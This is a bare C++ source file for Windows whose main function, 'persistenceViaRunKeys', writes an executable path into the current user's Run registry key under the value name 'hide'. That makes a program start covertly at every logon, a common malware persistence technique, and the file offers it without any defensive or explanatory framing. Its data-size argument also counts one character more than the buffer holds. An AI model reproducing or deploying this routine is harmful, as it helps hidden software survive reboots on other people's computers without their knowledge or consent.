#include <Windows.h>
#include <string>

int persistenceViaRunKeys(const char* exe) {
    HKEY hkey = NULL;
    LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        DWORD dataSize = 0;
        res = RegQueryValueExW(hkey, L"hide", NULL, NULL, NULL, &dataSize);
        if (res != ERROR_SUCCESS) {
            wchar_t* wide_exe = NULL;
            int wide_len = MultiByteToWideChar(CP_UTF8, 0, exe, -1, NULL, 0);
            wide_exe = new wchar_t[wide_len];
            MultiByteToWideChar(CP_UTF8, 0, exe, -1, wide_exe, wide_len);
            RegSetValueExW(hkey, L"hide", 0, REG_SZ, (BYTE*)wide_exe, (wide_len + 1) * sizeof(wchar_t));
            delete[] wide_exe;
        }
        RegCloseKey(hkey);
    }
    return 0;
}

const char* findFilePath(const char* filename) {
    char buffer[MAX_PATH];
    GetFullPathNameA(filename, MAX_PATH, buffer, nullptr);
    return _strdup(buffer);
}

std::wstring findFileDirectory(const wchar_t* filename) {
    wchar_t buffer[MAX_PATH];
    GetFullPathNameW(filename, MAX_PATH, buffer, nullptr);
    wchar_t* lastSlash = wcsrchr(buffer, L'\\');

    if (lastSlash != nullptr) {
        *lastSlash = L'\0';
        return std::wstring(buffer);
    }
    else {
        return L"";
    }
}


